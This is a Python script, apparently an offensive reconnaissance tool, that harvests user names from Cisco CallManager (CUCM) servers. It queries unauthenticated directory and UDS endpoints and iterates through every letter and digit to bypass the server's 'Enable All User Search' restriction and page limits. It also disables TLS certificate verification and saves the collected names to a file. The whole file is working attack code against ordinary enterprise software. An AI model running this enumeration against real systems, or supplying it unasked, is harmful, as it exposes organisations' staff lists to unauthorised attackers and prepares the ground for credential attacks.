#!/usr/bin/env python3

__author__ = "Mike Bond"
__copyright__ = "Copyright (c) 2021"
__license__ = "MIT"
__originalDate__ = "20210829"
__modifiedDate__ = "20210829"
__version__ = "0.1"
__maintainer__ = "Mike Bond"
__status__ = "Beta"

"""
vnum.py connects to Cisco CallManager to extract user names.
"""


""" Import Modules """
import argparse
from bs4 import BeautifulSoup
import ssl
import sys
from termcolor import colored
import urllib.request
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError


""" Define Color Status """
error = '\033[1m\033[31m[!]\033[0m'
warning = '\033[1m\033[33m[-]\033[0m'
info = '\033[1m\033[94m[*]\033[0m'
complete = '\033[1m\033[92m[+]\033[0m'


""" Functions """
def output(results):
    """
    The output function saves the CUCM user names to a file in the current working directory
    :param: results
    :return:
    """
    with open('cucm_users.txt', 'w') as f:
        for row in results:
            f.write("%s\n" % str(row))


def axl_cucm(http,target,port,alpha,context):
    """
    The axl_cucm function connects to CUCM and extracts the AXL HTML Tag of Name to a list
    :param: http
    :param: target
    :param: port
    :param: alpha
    :return: result
    """
    try:
        print ('{0} Connecting to CUCM'.format(info))
        url = ('{0}://{1}:{2}/ccmcip/xmldirectorylist.jsp'.format(http,target,port))
        html = urllib.request.urlopen(url, context=context)
        if html.status == 200:
            result = []
            # Incremented list to bypass CUCM limit of 32 return results per page
            num = ['0','32','63','94','125','156','187','218','249','280','311','342','373','404','435','466','497']
            # Test each number and letter in alphabet
            for alph in alpha:
                # Produce results for every 32 user names
                for count in num:
                    url = ('{0}://{1}:{2}/ccmcip/xmldirectorylist.jsp?l={3}&f=&n=&start={4}'.format(http,target,port,alph,count))
                    html = urllib.request.urlopen(url, context=context)
                    soup = BeautifulSoup(html, 'lxml')
                    # Append user names to a list based on name HTML tag
                    for x in soup.find_all('name'):
                        result.append(x.string)
            return (result)

    except HTTPError as e:
        print('{0} Error code: '.format(error), e.code)
        sys.exit(-1)

    except URLError as e:
        print('{0} Error Reason: '.format(error), e.reason)
        sys.exit(-1)


def uds_cucm(http,target,port,alpha,context):
    """
    The uds_cucm function connects to CUCM and extracts the UDS HTML Tag of Name to a list
    :param: http
    :param: target
    :param: port
    :param: alpha
    :return: result
    """
    try:
        print ('{0} Connecting to CUCM'.format(info))
        url = ('{0}://{1}:{2}/ccmcip/xmldirectorylist.jsp'.format(http,target,port))
        html = urllib.request.urlopen(url, context=context)
        if html.status == 200:
            result = []
            num = ['0','500']
            # Test each number and letter in alphabet
            for alph in alpha:
                # Produce results for every 32 user names
                for count in num:
                    # Issues with UDS capping at 64 totalCount in CUCM 12.5; might be a bug
                    url = ('{0}://{1}:{2}/cucm-uds/users?last={3}&max=500&start={4}'.format(http,target,port,alph,count))
                    html = urllib.request.urlopen(url, context=context)
                    soup = BeautifulSoup(html, 'lxml')
                    # Append user names to a list based on name HTML tag
                    for x in soup.find_all('username'):
                        result.append(x.string)
            return (result)

    except HTTPError as e:
        print('{0} Error code: '.format(error), e.code)
        sys.exit(-1)

    except URLError as e:
        print('{0} Error Reason: '.format(error), e.reason)
        sys.exit(-1)


def security(port):
    """
    The security function checks if a common TCP port is used and returns the http variable as http or https
    :param: port
    :return: http
    """
    if port  == '80' or port == '8080':
        http = 'http'
        return http

    elif port == '443' or port == '8443':
        http = 'https'
        return http

    else:
         print ('{0} Port value must be 80, 443, 8080, or 8443'.format(error))
         sys.exit(-1)


def main():
    """
    #The main function checks for secure or unsecure connectivity
    :param:
    :return:
    """
    # Varialbe to Ignore SSL Self-Signing
    context = ssl._create_unverified_context()
    # Check if HTTP or HTTPS based on port argument
    http = security(args.port)

    # Variables for bypassing CUCM Enterprise Paramater of "Enable All User Search = False"
    alpha = ['a','b','c','d','e','f','g','h','i','j','k','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
             '0','1','2','3','4','5','6','7','8','9']

    # Check for API input
    if args.api == '2':
        res = uds_cucm(http,args.target,args.port,alpha,context)
    elif args.api == '1':
        y = axl_cucm(http,args.target,args.port,alpha,context)
        remove = ['Dial','EditDial','Exit','Next','Search']
        res = [i for i in y if i not in remove]
    else:
        print("{0} Scan Type Option must be between 1 and 2\n".format(error))
        sys.exit(-1)

    # Print results to a file
    output (res)


def print_ascii_art():
    """
    The print_art function prints the ASCII Art
    :param:
    :return:
    """
    ascii_art = """
    xx         xx  xxxx     xx  xx   xx  xxxx     xxxx    _____  
     xx       xx   xx xx    xx  xx   xx  xx xx   xx xx   (.---.) 
      xx     xx    xx  xx   xx  xx   xx  xx  xx xx  xx    /:::\  
       xx   xx     xx   xx  xx  xx   xx  xx   xxx   xx   '-----' 
        xx xx      xx    xx xx  xx   xx  xx    x    xx           
         xxx       xx     xxxx   xxxxx   xx         xx           
    """
    version = colored('\t\t   Version: ','red')+colored('{0} {1}','yellow').format(__version__,__status__)
    print (ascii_art,flush=True)
    print ('{0}\n'.format(version))


if __name__ == "__main__":
    # Use ArgParse with mandatory flag of -t -p -a
    try:
        # Call the 'print_art' function
        print_ascii_art()

        parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
        required = parser.add_argument_group("required arguments")
        required.add_argument("-t", "--target", type=str, help="Target CUCM Host IP Address",required=True)
        required.add_argument("-p", "--port", type=str, help="Target CUCM TCP Port",default='443')
        required.add_argument("-a {1,2}", "--api", help="Choose one of the following:\n"
                               "1 = CUCM AXL API\n"
                               "2 = CUCM UDS API",
                               default='2')
        args = parser.parse_args()

        ''' Call the 'main' function '''
        main()
    except KeyboardInterrupt:
        print("{0} User Interrupt! Quitting....\n".format(error))
        sys.exit(-1)
    except:
        raise
    print ('{0} Results saved as cucm_users.txt'.format(complete))
    exit()
